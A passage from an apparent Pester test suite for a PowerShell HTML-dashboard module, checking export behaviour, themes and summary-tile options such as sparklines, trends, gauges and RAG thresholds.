        Start-Sleep -Milliseconds 120
        Export-DhDashboard -Report $report -OutputPath $htmlPath   # no -Force
        $after = (Get-Item $htmlPath).LastWriteTime
        $after | Should -Be $before
    }

    It 'Overwrites existing file with -Force' {
        $htmlPath = Join-Path $tmpDir 'test-force-overwrite.html'
        Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
        $before = (Get-Item $htmlPath).LastWriteTime
        Start-Sleep -Milliseconds 120
        Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
        $after = (Get-Item $htmlPath).LastWriteTime
        $after | Should -BeGreaterThan $before
    }

    It 'HTML contains outLinks JSON when tables are linked' {
        $data2 = @([PSCustomObject]@{ Host = 'esx01'; VM = 'vm01' })
        Add-DhTable -Report $report -TableId 'vms' -Title 'VMs' -Data $data2
        Set-DhTableLink -Report $report -MasterTableId 'hosts' -DetailTableId 'vms' `
                      -MasterField 'Host' -DetailField 'Host'
        $htmlPath = Join-Path $tmpDir 'test-linked.html'
        Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
        $content = Get-Content $htmlPath -Raw
        $content | Should -Match '"outLinks"'
        $content | Should -Match 'link-badge-vms'
    }

    It 'HTML serialises string threshold Value key correctly' {
        $strThr = @(@{ Value='OK'; Class='cell-ok' }, @{ Value='Fail'; Class='cell-danger' })
        $cols   = @(@{ Field='Status'; Label='Status'; Thresholds=$strThr })
        $rThr   = New-DhDashboard -Title 'String Thr Test'
        Add-DhTable -Report $rThr -TableId 'st' -Title 'T' `
            -Data @([PSCustomObject]@{Status='OK'}) -Columns $cols
        $htmlPath = Join-Path $tmpDir 'test-string-threshold.html'
        Export-DhDashboard -Report $rThr -OutputPath $htmlPath -Force
        $content = Get-Content $htmlPath -Raw
        $content | Should -Match '"value":"OK"'
        $content | Should -Match '"value":"Fail"'
    }

    It 'HTML serialises PinFirst column property' {
        $cols = @(@{ Field='Name'; Label='N'; PinFirst=$true })
        $rPin = New-DhDashboard -Title 'PinFirst Test'
        Add-DhTable -Report $rPin -TableId 'pf' -Title 'T' `
            -Data @([PSCustomObject]@{Name='A'}) -Columns $cols
        $htmlPath = Join-Path $tmpDir 'test-pinfirst.html'
        Export-DhDashboard -Report $rPin -OutputPath $htmlPath -Force
        (Get-Content $htmlPath -Raw) | Should -Match '"pinFirst":true'
    }

    It 'HTML suppresses nav-title span when NavTitle is empty' {
        $rNt = New-DhDashboard -Title 'No Nav Title' -NavTitle ''
        Add-DhTable -Report $rNt -TableId 'nt' -Title 'T' `
            -Data @([PSCustomObject]@{X=1})
        $htmlPath = Join-Path $tmpDir 'test-navtitle-empty.html'
        Export-DhDashboard -Report $rNt -OutputPath $htmlPath -Force
        $content = Get-Content $htmlPath -Raw
        $content | Should -Not -Match 'class="nav-title"'
    }

    It 'HTML renders custom NavTitle in nav bar' {
        $rNt2 = New-DhDashboard -Title 'Full Title' -NavTitle 'Short'
        Add-DhTable -Report $rNt2 -TableId 'nt2' -Title 'T' `
            -Data @([PSCustomObject]@{X=1})
        $htmlPath = Join-Path $tmpDir 'test-navtitle-custom.html'
        Export-DhDashboard -Report $rNt2 -OutputPath $htmlPath -Force
        $content = Get-Content $htmlPath -Raw
        $content | Should -Match '>Short<'
        $content | Should -Not -Match '>Full Title<.*nav-title'
    }

    It 'HTML uses exportFileName for table config' {
        $rFn = New-DhDashboard -Title 'ExportFn Test'
        Add-DhTable -Report $rFn -TableId 'efn' -Title 'T' `
            -Data @([PSCustomObject]@{X=1}) -ExportFileName 'my-report-2026'
        $htmlPath = Join-Path $tmpDir 'test-exportfn.html'
        Export-DhDashboard -Report $rFn -OutputPath $htmlPath -Force
        (Get-Content $htmlPath -Raw) | Should -Match '"exportFileName":"my-report-2026"'
    }

    It 'HTML contains threshold config in TABLES_CONFIG when column thresholds are defined' {
        $thresholds = @(@{ Max = 70; Class = 'cell-ok' }, @{ Class = 'cell-danger' })
        $cols = @(@{ Field = 'CPU'; Label = 'CPU'; Thresholds = $thresholds })
        $rThr = New-DhDashboard -Title 'Threshold Test'
        Add-DhTable -Report $rThr -TableId 'thr' -Title 'T' -Data @([PSCustomObject]@{ CPU = 55 }) `
                        -Columns $cols
        $htmlPath = Join-Path $tmpDir 'test-thresholds.html'
        Export-DhDashboard -Report $rThr -OutputPath $htmlPath -Force
        (Get-Content $htmlPath -Raw) | Should -Match '"thresholds"'
    }

    It 'HTML contains charts config in TABLES_CONFIG when charts are defined' {
        $rChart = New-DhDashboard -Title 'Chart Test'
        Add-DhTable -Report $rChart -TableId 'ch' -Title 'T' `
                        -Data @([PSCustomObject]@{ Status = 'OK' }) `
                        -Charts @(@{ Title = 'Status'; Field = 'Status'; Type = 'pie' })
        $htmlPath = Join-Path $tmpDir 'test-charts.html'
        Export-DhDashboard -Report $rChart -OutputPath $htmlPath -Force
        $content = Get-Content $htmlPath -Raw
        $content | Should -Match '"charts"'
        $content | Should -Match 'charts-container'
    }

    It 'HTML always embeds both style blocks with data-theme attributes' {
        $r2 = New-DhDashboard -Title 'Dual' -Theme Default
        Add-DhTable -Report $r2 -TableId 'dt' -Title 'T' -Data @([PSCustomObject]@{ X = 1 })
        $htmlPath = Join-Path $tmpDir 'test-dual-theme.html'
        Export-DhDashboard -Report $r2 -OutputPath $htmlPath -Force
        $content = Get-Content $htmlPath -Raw
        $content | Should -Match 'id="theme-primary"'
        $content | Should -Match 'id="theme-alternate"'
        $content | Should -Match 'data-theme="DefaultLight"'
        $content | Should -Match 'data-theme="DefaultDark"'
        $content | Should -Match 'media="none"'
    }

    It 'Company theme: no external CSS file — CSS is self-contained in the HTML' {
        $r3 = New-DhDashboard -Title 'Dual2' -Theme Company
        Add-DhTable -Report $r3 -TableId 'dt2' -Title 'T' -Data @([PSCustomObject]@{ X = 1 })
        $htmlPath = Join-Path $tmpDir 'test-company-no-css.html'
        Export-DhDashboard -Report $r3 -OutputPath $htmlPath -Force
        # No companion CSS file should exist in the output directory
        $cssFile = Join-Path $tmpDir 'theme-css-company-light.css'
        Test-Path $cssFile | Should -Be $false
        # Both CSS variants embedded in the HTML
        $content = Get-Content $htmlPath -Raw
        $content | Should -Match '--company-crimson'   # CompanyLight CSS embedded
        $content | Should -Match '#0E0709'             # CompanyDark CSS embedded
    }

    It 'No external CSS file is ever written for any theme family' {
        foreach ($family in @('Default','Azure','VMware','Grey','Company')) {
            $r = New-DhDashboard -Title "T-$family" -Theme $family
            Add-DhTable -Report $r -TableId "t$family" -Title 'T' -Data @([PSCustomObject]@{ X = 1 })
            $htmlPath = Join-Path $tmpDir "test-no-css-$family.html"
            Export-DhDashboard -Report $r -OutputPath $htmlPath -Force
            $cssCount = @(Get-ChildItem -Path $tmpDir -Filter '*.css' -ErrorAction SilentlyContinue).Count
            $cssCount | Should -Be 0 -Because "theme '$family' must not produce external CSS"
        }
    }

    It 'Creates output directory if it does not exist' {
        $newDir   = Join-Path $tmpDir ('newsubdir_' + [guid]::NewGuid().ToString('N').Substring(0,8))
        $htmlPath = Join-Path $newDir 'report.html'
        Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
        Test-Path $htmlPath | Should -Be $true
    }
}

# ---------------------------------------------------------------------------
# Add-DhSummary
# ---------------------------------------------------------------------------
Describe 'Add-DhSummary' {

    BeforeEach {
        $script:report = New-DhDashboard -Title 'T'
    }

    It 'Stores summary tiles in report object' {
        Add-DhSummary -Report $report -Items @(
            @{ Label = 'Total'; Value = 42 }
        )
        $report['Summary'] | Should -Not -BeNullOrEmpty
        $report['Summary'].Count | Should -Be 1
        $report['Summary'][0].Label | Should -Be 'Total'
        $report['Summary'][0].Value | Should -Be 42
    }

    It 'Normalises optional fields with safe defaults' {
        Add-DhSummary -Report $report -Items @(
            @{ Label = 'X'; Value = 1 }
        )
        $tile = $report['Summary'][0]
        $tile['Icon']     | Should -Be ''
        $tile['SubLabel'] | Should -Be ''
        $tile['Class']    | Should -Be ''
        $tile['Format']   | Should -Be ''
        $tile['Decimals'] | Should -Be -1
        $tile['Currency'] | Should -Be ''
    }

    It 'Preserves explicit optional fields' {
        Add-DhSummary -Report $report -Items @(
            @{ Label='Cost'; Value=1234.5; Icon='💶'; Format='currency'; Locale='it-IT'; Currency='EUR'; Decimals=2; Class='cell-ok'; SubLabel='per month' }
        )
        $tile = $report['Summary'][0]
        $tile.Icon     | Should -Be '💶'
        $tile.Format   | Should -Be 'currency'
        $tile.Currency | Should -Be 'EUR'
        $tile.Decimals | Should -Be 2
        $tile.Class    | Should -Be 'cell-ok'
        $tile.SubLabel | Should -Be 'per month'
    }

    It 'Accepts multiple tiles' {
        Add-DhSummary -Report $report -Items @(
            @{ Label = 'A'; Value = 1 }
            @{ Label = 'B'; Value = 2 }
            @{ Label = 'C'; Value = 3 }
        )
        $report['Summary'].Count | Should -Be 3
    }

    It 'Warns when called a second time (replaces existing summary)' {
        Add-DhSummary -Report $report -Items @(@{ Label='First'; Value=1 })
        { Add-DhSummary -Report $report -Items @(@{ Label='Second'; Value=2 }) -WarningAction Stop } |
            Should -Throw
        $report['Summary'][0].Label | Should -Be 'Second'
    }

    It 'Throws when an item is missing Label key' {
        { Add-DhSummary -Report $report -Items @(@{ Value=1 }) } | Should -Throw
    }

    It 'Throws when an item is missing Value key' {
        { Add-DhSummary -Report $report -Items @(@{ Label='X' }) } | Should -Throw
    }

    It 'HTML contains SUMMARY_CONFIG with tile label' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_SumTest_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            Add-DhSummary -Report $report -Items @(@{ Label='Total Servers'; Value=42 })
            $data = @([PSCustomObject]@{ X = 1 })
            Add-DhTable -Report $report -TableId 'tbl' -Title 'T' -Data $data
            $htmlPath = Join-Path $tmpDir2 'test-summary.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            (Get-Content $htmlPath -Raw) | Should -Match '"label":"Total Servers"'
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    # ---- Sparkline (v1.4 F2) -------------------------------------------------
    It 'Sparkline defaults to empty when not supplied' {
        Add-DhSummary -Report $report -Items @(@{ Label='X'; Value=1 })
        # Hashtable access may unwrap an empty array to $null in PowerShell —
        # what matters is that there are no values to render.
        @($report['Summary'][0].Sparkline).Count | Should -Be 0
    }

    It 'Sparkline keeps numeric values in order' {
        Add-DhSummary -Report $report -Items @(
            @{ Label='X'; Value=1; Sparkline=@(12,18,15,22,19,24,31) }
        )
        $s = $report['Summary'][0]
        $s.Sparkline.Count | Should -Be 7
        $s.Sparkline[0]    | Should -Be 12
        $s.Sparkline[-1]   | Should -Be 31
    }

    It 'SparklineStyle defaults to line' {
        Add-DhSummary -Report $report -Items @(@{ Label='X'; Value=1; Sparkline=@(1,2,3) })
        $report['Summary'][0].SparklineStyle | Should -Be 'line'
    }

    It 'SparklineStyle accepts area and bars' {
        Add-DhSummary -Report $report -Items @(
            @{ Label='A'; Value=1; Sparkline=@(1,2); SparklineStyle='area' }
            @{ Label='B'; Value=2; Sparkline=@(1,2); SparklineStyle='bars' }
        )
        $report['Summary'][0].SparklineStyle | Should -Be 'area'
        $report['Summary'][1].SparklineStyle | Should -Be 'bars'
    }

    It 'Rejects invalid SparklineStyle' {
        { Add-DhSummary -Report $report -Items @(
            @{ Label='X'; Value=1; Sparkline=@(1,2); SparklineStyle='waveform' }
        ) } | Should -Throw
    }

    It 'SparklineMin / SparklineMax stored as numbers' {
        Add-DhSummary -Report $report -Items @(
            @{ Label='X'; Value=1; Sparkline=@(1,2,3); SparklineMin=0; SparklineMax=100 }
        )
        $report['Summary'][0].SparklineMin | Should -Be 0
        $report['Summary'][0].SparklineMax | Should -Be 100
    }

    It 'SparklineMin / SparklineMax default to null when not supplied' {
        Add-DhSummary -Report $report -Items @(@{ Label='X'; Value=1; Sparkline=@(1,2) })
        $report['Summary'][0].SparklineMin | Should -BeNullOrEmpty
        $report['Summary'][0].SparklineMax | Should -BeNullOrEmpty
    }

    It 'Throws on non-numeric SparklineMin' {
        { Add-DhSummary -Report $report -Items @(
            @{ Label='X'; Value=1; Sparkline=@(1,2); SparklineMin='zero' }
        ) } | Should -Throw
    }

    It 'Drops non-numeric Sparkline values (with warning)' {
        Add-DhSummary -Report $report -Items @(
            @{ Label='X'; Value=1; Sparkline=@(1,'bogus',3) }
        ) -WarningAction SilentlyContinue
        $report['Summary'][0].Sparkline.Count | Should -Be 2
        $report['Summary'][0].Sparkline       | Should -Be @(1, 3)
    }

    # ---- Trend / delta indicator (v1.4 F1) -----------------------------------
    It 'Previous defaults to null when not supplied' {
        Add-DhSummary -Report $report -Items @(@{ Label='X'; Value=1 })
        $report['Summary'][0].Previous | Should -BeNullOrEmpty
    }

    It 'Previous stored as a number when supplied' {
        Add-DhSummary -Report $report -Items @(@{ Label='X'; Value=231; Previous=219 })
        $report['Summary'][0].Previous | Should -Be 219
    }

    It 'Throws when Previous is non-numeric' {
        { Add-DhSummary -Report $report -Items @(@{ Label='X'; Value=1; Previous='nope' }) } | Should -Throw
    }

    It 'Trend defaults to auto' {
        Add-DhSummary -Report $report -Items @(@{ Label='X'; Value=1 })
        $report['Summary'][0].Trend | Should -Be 'auto'
    }

    It 'Trend accepts up / down / flat' {
        Add-DhSummary -Report $report -Items @(
            @{ Label='A'; Value=1; Trend='up' }
            @{ Label='B'; Value=2; Trend='down' }
            @{ Label='C'; Value=3; Trend='flat' }
        )
        $report['Summary'][0].Trend | Should -Be 'up'
        $report['Summary'][1].Trend | Should -Be 'down'
        $report['Summary'][2].Trend | Should -Be 'flat'
    }

    It 'Rejects invalid Trend' {
        { Add-DhSummary -Report $report -Items @(@{ Label='X'; Value=1; Trend='sideways' }) } | Should -Throw
    }

    It 'TrendIsGood stays nullable (semantic default in JS)' {
        Add-DhSummary -Report $report -Items @(@{ Label='X'; Value=1 })
        $report['Summary'][0].TrendIsGood | Should -BeNullOrEmpty
    }

    It 'TrendIsGood preserved when explicitly true / false' {
        Add-DhSummary -Report $report -Items @(
            @{ Label='A'; Value=1; TrendIsGood=$true  }
            @{ Label='B'; Value=2; TrendIsGood=$false }
        )
        $report['Summary'][0].TrendIsGood | Should -Be $true
        $report['Summary'][1].TrendIsGood | Should -Be $false
    }

    It 'DeltaFormat defaults to both' {
        Add-DhSummary -Report $report -Items @(@{ Label='X'; Value=1 })
        $report['Summary'][0].DeltaFormat | Should -Be 'both'
    }

    It 'DeltaFormat accepts percent / absolute / both' {
        Add-DhSummary -Report $report -Items @(
            @{ Label='A'; Value=1; DeltaFormat='percent'  }
            @{ Label='B'; Value=2; DeltaFormat='absolute' }
            @{ Label='C'; Value=3; DeltaFormat='both'     }
        )
        $report['Summary'][0].DeltaFormat | Should -Be 'percent'
        $report['Summary'][1].DeltaFormat | Should -Be 'absolute'
        $report['Summary'][2].DeltaFormat | Should -Be 'both'
    }

    It 'Rejects invalid DeltaFormat' {
        { Add-DhSummary -Report $report -Items @(@{ Label='X'; Value=1; DeltaFormat='ratio' }) } | Should -Throw
    }

    It 'HTML omits delta keys when neither Previous nor explicit Trend supplied' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_DeltaTest_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            Add-DhSummary -Report $report -Items @(@{ Label='Plain'; Value=42 })
            $data = @([PSCustomObject]@{ X = 1 })
            Add-DhTable -Report $report -TableId 'tbl' -Title 'T' -Data $data
            $htmlPath = Join-Path $tmpDir2 'test-no-delta.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            $content | Should -Match '"label":"Plain"'
            $content | Should -Not -Match '"label":"Plain"[^}]*"previous":'
            $content | Should -Not -Match '"label":"Plain"[^}]*"trend":'
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    It 'Preserves decimal precision regardless of system locale (TryParse uses Invariant)' {
        # Regression test for the bug where Previous=92330.25 became 9233025
        # on it-IT systems because TryParse used CurrentCulture and treated
        # the period as a thousands separator.
        Add-DhSummary -Report $report -Items @(
            @{ Label='Revenue';     Value=99450.75; Previous=92330.25 }
            @{ Label='Conversions'; Value=58.4;     Previous=55.2 }
        )
        $report['Summary'][0].Previous | Should -Be 92330.25
        $report['Summary'][1].Previous | Should -Be 55.2
    }

    It 'HTML contains delta keys when Previous supplied' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_DeltaTest_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            Add-DhSummary -Report $report -Items @(
                @{ Label='Active'; Value=231; Previous=219 }
                @{ Label='Errors'; Value=4;   Previous=12;  TrendIsGood=$true; DeltaFormat='absolute' }
            )
            $data = @([PSCustomObject]@{ X = 1 })
            Add-DhTable -Report $report -TableId 'tbl' -Title 'T' -Data $data
            $htmlPath = Join-Path $tmpDir2 'test-with-delta.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            $content | Should -Match '"previous":219'
            $content | Should -Match '"trend":"auto"'
            $content | Should -Match '"trendIsGood":null'
            $content | Should -Match '"deltaFormat":"both"'
            # Inverted-good tile
            $content | Should -Match '"previous":12'
            $content | Should -Match '"trendIsGood":true'
            $content | Should -Match '"deltaFormat":"absolute"'
            # JS DELTA helper is embedded
            $content | Should -Match 'var DELTA\s*=\s*\{'
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    # ---- Tile styles bignumber / gauge (v1.4 F3 + F4) ------------------------
    It 'Style defaults to tile' {
        Add-DhSummary -Report $report -Items @(@{ Label='X'; Value=1 })
        $report['Summary'][0].Style | Should -Be 'tile'
    }

    It 'Style accepts bignumber and gauge' {
        Add-DhSummary -Report $report -Items @(
            @{ Style='bignumber'; Label='SLA';  Value='99.97%' }
            @{ Style='gauge';     Label='Disk'; Value=73 }
        )
        $report['Summary'][0].Style | Should -Be 'bignumber'
        $report['Summary'][1].Style | Should -Be 'gauge'
    }

    It 'Rejects invalid Style' {
        { Add-DhSummary -Report $report -Items @(@{ Style='hexagon'; Label='X'; Value=1 }) } | Should -Throw
    }

    It 'Bignumber preserves Caption when supplied' {
        Add-DhSummary -Report $report -Items @(
            @{ Style='bignumber'; Label='SLA'; Value='99.97%'; Caption='Target 99.9% — met' }
        )
        $report['Summary'][0].Caption | Should -Be 'Target 99.9% — met'
    }

    It 'Gauge defaults Min=0 / Max=100' {
        Add-DhSummary -Report $report -Items @(@{ Style='gauge'; Label='Disk'; Value=73 })
        $report['Summary'][0].Min | Should -Be 0
        $report['Summary'][0].Max | Should -Be 100
    }

    It 'Gauge respects custom Min / Max' {
        Add-DhSummary -Report $report -Items @(
            @{ Style='gauge'; Label='Cluster CPU'; Value=42; Min=0; Max=80 }
        )
        $report['Summary'][0].Min | Should -Be 0
        $report['Summary'][0].Max | Should -Be 80
    }

    It 'Gauge throws when Value is not numeric' {
        { Add-DhSummary -Report $report -Items @(@{ Style='gauge'; Label='X'; Value='abc' }) } | Should -Throw
    }

    It 'Gauge stores threshold list with Min/Max/Class' {
        Add-DhSummary -Report $report -Items @(
            @{ Style='gauge'; Label='Disk'; Value=73
               Thresholds=@(
                   @{ Min=0;  Class='cell-ok'     }
                   @{ Min=70; Class='cell-warn'   }
                   @{ Min=90; Class='cell-danger' }
               )
            }
        )
        $thr = $report['Summary'][0].Thresholds
        @($thr).Count | Should -Be 3
        $thr[0].Class | Should -Be 'cell-ok'
        $thr[1].Min   | Should -Be 70
        $thr[2].Class | Should -Be 'cell-danger'
    }

    It 'Gauge throws when threshold lacks Class' {
        { Add-DhSummary -Report $report -Items @(
            @{ Style='gauge'; Label='X'; Value=1
               Thresholds=@(@{ Min=0 })
            }
        ) } | Should -Throw
    }

    # ---- Unified -Rag parameter (v1.4 F13) -----------------------------------
    It 'Rag hashtable converts to Min/Max/Class threshold array' {
        Add-DhSummary -Report $report -Items @(
            @{ Style='gauge'; Label='CPU'; Value=42; Max=100
               Rag=@{
                   Green = @{ Max=70 }
                   Amber = @{ Min=70; Max=90 }
                   Red   = @{ Min=90 }
               }
            }
        )
        $thr = $report['Summary'][0].Thresholds
        @($thr).Count | Should -Be 3
        $thr[0].Class | Should -Be 'cell-ok'
        $thr[0].Max   | Should -Be 70
        $thr[1].Class | Should -Be 'cell-warn'
        $thr[1].Min   | Should -Be 70
        $thr[1].Max   | Should -Be 90
        $thr[2].Class | Should -Be 'cell-danger'
        $thr[2].Min   | Should -Be 90
        # Rag key is consumed and not echoed back
        $report['Summary'][0].Contains('Rag') | Should -Be $false
    }

    It 'Rag stores RagNoData flag when NoData=$true' {
        Add-DhSummary -Report $report -Items @(
            @{ Style='gauge'; Label='X'; Value=1
               Rag=@{ Green=@{Max=50}; Red=@{Min=50}; NoData=$true }
            }
        )
        $report['Summary'][0].RagNoData | Should -Be $true
    }

    It 'Rag wins over a legacy Thresholds array on the same item' {
        Add-DhSummary -Report $report -Items @(
            @{ Style='gauge'; Label='X'; Value=80
               Thresholds=@(
                   @{ Min=0;  Max=100; Class='cell-danger' }   # legacy — should be discarded
               )
               Rag=@{ Green=@{Max=70}; Amber=@{Min=70;Max=90}; Red=@{Min=90} }
            }
        )
        $thr = $report['Summary'][0].Thresholds
        @($thr).Count | Should -Be 3
        $thr[1].Class | Should -Be 'cell-warn'   # 80 falls in amber band
    }

    It 'Rag rejects unknown top-level key' {
        { Add-DhSummary -Report $report -Items @(
            @{ Style='gauge'; Label='X'; Value=1
               Rag=@{ Yellow=@{Max=70} }
            }
        ) } | Should -Throw
    }

    It 'Rag rejects unknown band-level key' {
        { Add-DhSummary -Report $report -Items @(
            @{ Style='gauge'; Label='X'; Value=1
               Rag=@{ Green=@{ Average=70 } }
            }
        ) } | Should -Throw
    }

    It 'Gauge accepts null Value when Rag NoData=$true (renderer paints cell-nodata)' {
        Add-DhSummary -Report $report -Items @(
            @{ Style='gauge'; Label='Feed'; Value=$null; Max=100
               Rag=@{ Green=@{Max=70}; Red=@{Min=70}; NoData=$true }
            }
        )
        $report['Summary'][0].RagNoData | Should -Be $true
    }

    It 'Gauge still rejects null Value when Rag NoData is NOT set' {
        { Add-DhSummary -Report $report -Items @(
            @{ Style='gauge'; Label='Feed'; Value=$null; Max=100
               Rag=@{ Green=@{Max=70}; Red=@{Min=70} }   # no NoData=$true
            }
        ) } | Should -Throw
    }

    It 'Rag rejects non-numeric band bounds' {
        { Add-DhSummary -Report $report -Items @(
            @{ Style='gauge'; Label='X'; Value=1
               Rag=@{ Green=@{ Max='seventy' } }
            }
        ) } | Should -Throw
    }

    It 'HTML contains style key + bignumber caption + gauge thresholds' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_StyleTest_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            Add-DhSummary -Report $report -Items @(
                @{ Label='Total'; Value=42 }
                @{ Style='bignumber'; Label='SLA'; Value='99.97%'; Caption='Target 99.9% — met' }
                @{ Style='gauge'; Label='Disk used'; Value=73; Max=100; Unit='%'
                   Thresholds=@(
                       @{ Min=0;  Class='cell-ok'     }
                       @{ Min=70; Class='cell-warn'   }
                       @{ Min=90; Class='cell-danger' }
                   )
                }
            )
            $data = @([PSCustomObject]@{ X = 1 })
            Add-DhTable -Report $report -TableId 'tbl' -Title 'T' -Data $data
            $htmlPath = Join-Path $tmpDir2 'test-styles.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            # Style field on all three tiles
            $content | Should -Match '"label":"Total"[^}]*"style":"tile"'
            $content | Should -Match '"label":"SLA"[^}]*"style":"bignumber"'
            $content | Should -Match '"label":"Disk used"[^}]*"style":"gauge"'
            # Bignumber caption present (escaped em-dash)
            $content | Should -Match '"caption":"Target 99\.9% — met"'
            # Gauge fields present
            $content | Should -Match '"label":"Disk used"[^}]*"min":0,"max":100,"unit":"%"'
            $content | Should -Match '"min":70,"class":"cell-warn"'
            $content | Should -Match '"min":90,"class":"cell-danger"'
            # JS renderers present
            $content | Should -Match 'function buildBignumberTile'
            $content | Should -Match 'function buildGaugeTile'
            $content | Should -Match 'function pickThresholdClass'
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    # ---- Per-NavGroup summary strips (v1.4.1) --------------------------------
    It 'Without -NavGroup the strip goes to $Report.Summary (legacy path)' {
        Add-DhSummary -Report $report -Items @(@{ Label='X'; Value=1 })
        @($report['Summary']).Count | Should -Be 1
        # No summarystrip block created
        if ($report.Contains('Blocks')) {
            ($report['Blocks'] | Where-Object { $_.BlockType -eq 'summarystrip' }) | Should -BeNullOrEmpty
        }
    }

    It 'With -NavGroup the strip lives in $Report.Blocks (not Summary)' {
        Add-DhSummary -Report $report -NavGroup 'Identity' -Items @(
            @{ Label='Active users'; Value=231 }
        )
        # Legacy Summary untouched
        if ($report.Contains('Summary')) { @($report['Summary']).Count | Should -Be 0 }
        # Block emitted instead
        $b = $report['Blocks'] | Where-Object { $_.BlockType -eq 'summarystrip' } | Select-Object -First 1
        $b              | Should -Not -BeNullOrEmpty
        $b.NavGroup     | Should -Be 'Identity'
        $b.Id           | Should -Be 'summary-identity'   # auto-derived slug
        @($b.Items).Count | Should -Be 1
        $b.Items[0].Label | Should -Be 'Active users'
    }

    It 'NavSubGroup carries through and is part of the auto Id' {
        Add-DhSummary -Report $report -NavGroup 'Identity' -NavSubGroup 'Production' -Items @(
            @{ Label='X'; Value=1 }
        )
        $b = $report['Blocks'][0]
        $b.NavSubGroup | Should -Be 'Production'
        $b.Id          | Should -Be 'summary-identity-production'
    }

    It 'Auto Id slugifies spaces and uppercase' {
        Add-DhSummary -Report $report -NavGroup 'My Big Group' -Items @(@{ Label='X'; Value=1 })
        $report['Blocks'][0].Id | Should -Be 'summary-my-big-group'
    }

    It 'Explicit -Id overrides the auto-derived value' {
        Add-DhSummary -Report $report -NavGroup 'Identity' -Id 'kpi-overview' -Items @(
            @{ Label='X'; Value=1 }
        )
        $report['Blocks'][0].Id | Should -Be 'kpi-overview'
    }

    It 'Multiple per-group summaries coexist' {
        Add-DhSummary -Report $report -NavGroup 'Identity'       -Items @(@{ Label='Users'; Value=231 })
        Add-DhSummary -Report $report -NavGroup 'Infrastructure' -Items @(@{ Label='Hosts'; Value=42  })
        Add-DhSummary -Report $report -NavGroup 'Finance'        -Items @(@{ Label='MRR';   Value=1.2e6 })
        @($report['Blocks'] | Where-Object { $_.BlockType -eq 'summarystrip' }).Count | Should -Be 3
    }

    It 'Throws on duplicate auto-Id (same NavGroup + NavSubGroup twice)' {
        Add-DhSummary -Report $report -NavGroup 'Identity' -Items @(@{ Label='X'; Value=1 })
        { Add-DhSummary -Report $report -NavGroup 'Identity' -Items @(@{ Label='Y'; Value=2 }) } | Should -Throw
    }

    It 'Per-group strip can coexist with a global top-of-page strip' {
        Add-DhSummary -Report $report -Items @(@{ Label='Global';  Value=1 })   # legacy
        Add-DhSummary -Report $report -NavGroup 'Identity' -Items @(@{ Label='Per-group'; Value=2 })
        @($report['Summary']).Count                                          | Should -Be 1
        @($report['Blocks'] | Where-Object { $_.BlockType -eq 'summarystrip' }).Count | Should -Be 1
    }

    It 'HTML emits summarystrip block with items + NavGroup' {
        $tmpDir2 = Join-Path ([IO.Path]::GetTempPath()) ('DH_SummaryNav_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $tmpDir2 | Out-Null
        try {
            Add-DhSummary -Report $report -NavGroup 'Identity' -Title 'Identity KPIs' -Items @(
                @{ Style='bignumber'; Label='Active users';  Value=231;   Caption='Last 24h'; Class='cell-ok' }
                @{                    Label='Failed logins'; Value=842;   Previous=920; TrendIsGood=$true }
                @{ Style='gauge';     Label='Auth latency';  Value=42;    Max=120; Unit='ms'
                   Rag=@{ Green=@{Max=50}; Amber=@{Min=50;Max=80}; Red=@{Min=80} } }
            )
            $data = @([PSCustomObject]@{ X = 1 })
            Add-DhTable -Report $report -TableId 'tbl' -Title 'T' -Data $data -NavGroup 'Identity'
            $htmlPath = Join-Path $tmpDir2 'test-summarystrip.html'
            Export-DhDashboard -Report $report -OutputPath $htmlPath -Force
            $content = Get-Content $htmlPath -Raw
            $content | Should -Match '"blockType":"summarystrip"'
            $content | Should -Match '"label":"Active users"'
            $content | Should -Match '"style":"bignumber"'
            $content | Should -Match '"caption":"Last 24h"'
            $content | Should -Match '"previous":920'
            $content | Should -Match '"trendIsGood":true'
            $content | Should -Match '"style":"gauge"'
            $content | Should -Match '"unit":"ms"'
            $content | Should -Match 'function renderSummaryStrip'
            # Block-section emitted with data-navgroup so nav routing hides/shows it
            $content | Should -Match 'id="bsection-summary-identity"[^>]*data-navgroup="Identity"'
        } finally {
            Remove-Item $tmpDir2 -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    # ---- Per-tile Action (v1.4.2) --------------------------------------------
    It 'Tile Action defaults to null when not supplied' {
        Add-DhSummary -Report $report -Items @(@{ Label='X'; Value=1 })
        $report['Summary'][0].Action | Should -BeNullOrEmpty
    }

    It 'Tile Action with TableId is stored' {
        Add-DhSummary -Report $report -Items @(
            @{ Label='Active'; Value=42; Action=@{ TableId='items'; Filter='active' } }
        )
        $report['Summary'][0].Action.TableId | Should -Be 'items'
        $report['Summary'][0].Action.Filter  | Should -Be 'active'
        $report['Summary'][0].Action.Url     | Should -Be ''
    }

    It 'Tile Action with Url is stored' {
        Add-DhSummary -Report $report -Items @(
